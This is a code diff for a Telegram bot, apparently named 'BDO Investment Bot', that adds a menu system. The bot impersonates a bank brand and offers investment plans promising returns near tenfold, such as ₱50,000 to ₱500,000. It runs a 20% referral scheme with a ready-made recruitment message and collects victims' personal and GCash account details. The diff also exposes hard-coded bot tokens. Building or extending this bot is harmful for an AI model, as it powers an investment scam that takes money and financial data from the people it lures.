@@ -65,7 +65,7 @@ cron.schedule('*/10 * * * *', async () => {
 // =============================================
 // BOT CONFIGURATION
 // =============================================
-const bot = new TelegramBot("7876987617:AAHZNpjpxWeaICpfDOeegiS9hZETgIzLXts", { polling: true });
+const bot = new TelegramBot("7739574932:AAHnQpeZR9obL8u7-oUdenZpIcSvTl5eZrY", { polling: true });
 
 // Admin user IDs to notify
 const ADMIN_IDS = [6300694007, 7279302614];
@@ -104,6 +104,58 @@ const investmentPlans = [
     { amount: "₱45,000", earnings: "₱400,000", link: "https://bdo-invest.com/plan/45k", short: "45K" },
     { amount: "₱50,000", earnings: "₱500,000", link: "https://bdo-invest.com/plan/50k", short: "50K" }
 ];
+
+// =============================================
+// MENU BUTTON SYSTEM
+// =============================================
+
+// Main menu keyboard
+const mainMenuButtons = {
+    reply_markup: {
+        keyboard: [
+            [{ text: "💰 INVESTMENT PLANS" }],
+            [{ text: "👥 REFERRAL PROGRAM" }],
+            [{ text: "👤 MY ACCOUNT" }]
+        ],
+        resize_keyboard: true,
+        one_time_keyboard: false
+    }
+};
+
+// Investment plans inline keyboard
+const investmentPlanButtons = {
+    reply_markup: {
+        inline_keyboard: [
+            ...chunkArray(investmentPlans.map(plan => ({
+                text: `${plan.amount} → ${plan.earnings}`,
+                callback_data: `plan_${plan.short}`
+            }), 2),
+            [{ text: "⬅️ BACK TO MENU", callback_data: "back_to_menu" }]
+        ]
+    }
+};
+
+// Account management buttons
+const accountButtons = {
+    reply_markup: {
+        inline_keyboard: [
+            [{ text: "📝 VIEW MY DETAILS", callback_data: "view_details" }],
+            [{ text: "🗑️ DELETE ACCOUNT", callback_data: "delete_account" }],
+            [{ text: "⬅️ BACK TO MENU", callback_data: "back_to_menu" }]
+        ]
+    }
+};
+
+// Referral menu buttons
+const referralButtons = {
+    reply_markup: {
+        inline_keyboard: [
+            [{ text: "📤 SHARE REFERRAL LINK", callback_data: "share_referral" }],
+            [{ text: "💰 VIEW EARNINGS", callback_data: "view_earnings" }],
+            [{ text: "⬅️ BACK TO MENU", callback_data: "back_to_menu" }]
+        ]
+    }
+};
 
 // =============================================
 // HELPER FUNCTIONS
@@ -174,6 +226,46 @@ function formatUserDetails(user) {
 }
 
 // =============================================
+// MENU FUNCTIONS
+// =============================================
+
+// Show main menu
+async function showMainMenu(chatId) {
+    const menuMessage = `🏦 *BDO Investment Bot*\n\n` +
+        `🔒 Secure | 💰 Profitable | 🚀 Fast\n\n` +
+        `Select an option below to get started:`;
+    
+    await bot.sendMessage(chatId, menuMessage, {
+        parse_mode: "Markdown",
+        ...mainMenuButtons
+    });
+}
+
+async function showReferralMenu(chatId, userId) {
+    const user = userDatabase.get(userId);
+    const referralMessage = `👥 *Referral Program*\n\n` +
+        `Earn 20% commission from every investment made by your referrals!\n\n` +
+        `🔗 Your unique referral link:\n` +
+        `https://t.me/BDOInvestmentsBot?start=${user.referralCode}\n\n` +
+        `💰 Total Earnings: ₱${user.balance.toFixed(2)}`;
+    
+    await bot.sendMessage(chatId, referralMessage, {
+        parse_mode: "Markdown",
+        ...referralButtons
+    });
+}
+
+async function showAccountMenu(chatId, userId) {
+    const accountMessage = `👤 *Account Management*\n\n` +
+        `Manage your account details and settings:`;
+    
+    await bot.sendMessage(chatId, accountMessage, {
+        parse_mode: "Markdown",
+        ...accountButtons
+    });
+}
+
+// =============================================
 // COMMAND HANDLERS
 // =============================================
 
@@ -189,21 +281,9 @@ bot.onText(/\/start(?:\s+(\w+))?/, async (msg, match) => {
         const user = userDatabase.get(userId);
         
         if (user.step === REGISTRATION_STEPS.COMPLETE) {
-            const welcomeBackMessage = `👋 *Welcome back, ${user.name}!*\n\n` +
-                `You're already registered with us. Here are your details:\n\n` +
-                formatUserDetails({...user, id: userId});
-
-            const options = {
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: "💰 Invest Now", callback_data: "invest_now" }],
-                        [{ text: "🗑️ Delete My Account", callback_data: "delete_account" }],
-                        [{ text: "📤 Refer Friends", callback_data: "refer_friends" }]
-                    ]
-                }
-            };
-
-            return await sendMessageWithImage(chatId, welcomeBackMessage, options);
+            const welcomeBackMessage = `👋 *Welcome back, ${user.name}!*`;
+            await sendMessageWithImage(chatId, welcomeBackMessage);
+            return await showMainMenu(chatId);
         }
     }
 
@@ -249,9 +329,7 @@ bot.onText(/\/start(?:\s+(\w+))?/, async (msg, match) => {
     const options = {
         reply_markup: {
             inline_keyboard: [
-                [{ text: "📝 Register Now", callback_data: "start_registration" }],
-                [{ text: "💰 Invest Now", callback_data: "need_register" }],
-                [{ text: "📤 Refer Friends", callback_data: "refer_friends" }]
+                [{ text: "📝 Register Now", callback_data: "start_registration" }]
             ]
         }
     };
@@ -259,47 +337,47 @@ bot.onText(/\/start(?:\s+(\w+))?/, async (msg, match) => {
     await sendMessageWithImage(chatId, welcomeMessage, options);
 });
 
-// Command: /invest
-bot.onText(/\/invest/, async (msg) => {
+// Handle menu button clicks
+bot.on("message", async (msg) => {
+    if (msg.text?.startsWith('/')) return;
+    
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    
+    const text = msg.text?.trim();
+
     if (!userDatabase.has(userId)) {
-        return await sendMessageWithImage(chatId, "Please /start first to begin");
+        return await showMainMenu(chatId);
     }
 
     const user = userDatabase.get(userId);
-    if (user.step !== REGISTRATION_STEPS.COMPLETE) {
-        return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
-    }
 
-    await showInvestmentPlans(chatId);
-});
-
-// Command: /refer
-bot.onText(/\/refer/, async (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    
-    if (!userDatabase.has(userId)) {
-        return await sendMessageWithImage(chatId, "Please /start first to get your referral code");
+    switch (text) {
+        case "💰 INVESTMENT PLANS":
+            if (user.step !== REGISTRATION_STEPS.COMPLETE) {
+                return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\nUse /start to begin.");
+            }
+            await showInvestmentPlans(chatId);
+            break;
+            
+        case "👥 REFERRAL PROGRAM":
+            if (user.step !== REGISTRATION_STEPS.COMPLETE) {
+                return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\nUse /start to begin.");
+            }
+            await showReferralMenu(chatId, userId);
+            break;
+            
+        case "👤 MY ACCOUNT":
+            if (user.step !== REGISTRATION_STEPS.COMPLETE) {
+                return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\nUse /start to begin.");
+            }
+            await showAccountMenu(chatId, userId);
+            break;
+            
+        default:
+            // Handle registration steps
+            await handleRegistrationStep(chatId, userId, text);
+            break;
     }
-    
-    const user = userDatabase.get(userId);
-    if (user.step !== REGISTRATION_STEPS.COMPLETE) {
-        return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
-    }
-    
-    const referralMessage = `🚀 *Refer Friends & Earn 20% Commission!*\n\n` +
-        `Share your referral link below:\n\n` +
-        `🔗 *Your Referral Link:*\n` +
-        `https://t.me/BDOInvestmentsBot?start=${user.referralCode}\n\n` +
-        `📢 *Sample Message:*\n` +
-        `"Join BDO Binary Investments using my link! ` +
-        `I've earned ₱${user.balance.toFixed(2)} from referrals! ` +
-        `Here's my link: https://t.me/BDOInvestmentsBot?start=${user.referralCode}"`;
-    
-    await sendMessageWithImage(chatId, referralMessage);
 });
 
 // Handle callback queries
@@ -324,24 +402,35 @@ bot.on("callback_query", async (query) => {
             
         case "invest_now":
             if (user.step !== REGISTRATION_STEPS.COMPLETE) {
-                return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
+                return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\nUse /start to begin.");
             }
             await showInvestmentPlans(chatId);
-            break;
-            
-        case "need_register":
-            await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
             break;
             
         case "view_plans":
             await showInvestmentPlans(chatId);
             break;
             
-        case "refer_friends":
-            if (user.step !== REGISTRATION_STEPS.COMPLETE) {
-                return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
-            }
-            await bot.onText(/\/refer/, { chat_id: chatId, from: { id: userId } });
+        case "back_to_menu":
+            await showMainMenu(chatId);
+            break;
+            
+        case "view_details":
+            await sendMessageWithImage(chatId, formatUserDetails({...user, id: userId}));
+            break;
+            
+        case "share_referral":
+            const shareMessage = `📤 *Share Your Referral Link*\n\n` +
+                `Copy this message to share with friends:\n\n` +
+                `Join BDO Binary Investments using my link! ` +
+                `I've earned ₱${user.balance.toFixed(2)} from referrals! ` +
+                `Here's my link: https://t.me/BDOInvestmentsBot?start=${user.referralCode}`;
+            await bot.sendMessage(chatId, shareMessage);
+            break;
+            
+        case "view_earnings":
+            await bot.sendMessage(chatId, 
+                `💰 Your total referral earnings: ₱${user.balance.toFixed(2)}`);
             break;
             
         case "delete_account":
@@ -491,27 +580,10 @@ async function showInvestmentPlans(chatId) {
 
 async function completeRegistration(chatId, user) {
     const confirmation = `✅ *Registration Complete!*\n\n` +
-        `*Account Details:*\n` +
-        `👤 Name: ${user.registrationData.fullName}\n` +
-        `⚤ Gender: ${user.registrationData.gender}\n` +
-        `📧 Email: ${user.registrationData.email}\n` +
-        `📱 Phone: ${user.registrationData.phone}\n` +
-        `🌍 Country: ${user.registrationData.country}\n` +
-        `💳 GCash: ${user.registrationData.gcashName} (${user.registrationData.gcashAccount})\n\n` +
-        `💰 *Your Referral Code:* \`${user.referralCode}\`\n` +
-        `🔗 *Referral Link:* https://t.me/BDOInvestmentsBot?start=${user.referralCode}\n\n` +
-        `You can now start investing!`;
-
-    const options = {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: "💰 Invest Now", callback_data: "invest_now" }],
-                [{ text: "📤 Refer Friends", callback_data: "refer_friends" }]
-            ]
-        }
-    };
-
-    await sendMessageWithImage(chatId, confirmation, options);
+        `You can now access all features using the menu below.`;
+    
+    await sendMessageWithImage(chatId, confirmation);
+    await showMainMenu(chatId);
 }
 
 async function processInvestment(chatId, userId, plan) {
@@ -570,8 +642,6 @@ async function processInvestment(chatId, userId, plan) {
 }
 
 async function handleAccountDeletion(chatId, userId) {
-    const user = userDatabase.get(userId);
-    
     const confirmationMessage = `⚠️ *Confirm Account Deletion* ⚠️\n\n` +
         `Are you sure you want to delete your account? This will:\n\n` +
         `• Permanently remove all your data\n` +
@@ -592,4 +662,4 @@ async function handleAccountDeletion(chatId, userId) {
 }
 
 // Start the bot
-console.log("BDO Investment Bot is running with database and keep-alive system...");
+console.log("BDO Investment Bot with professional menu system is running...")
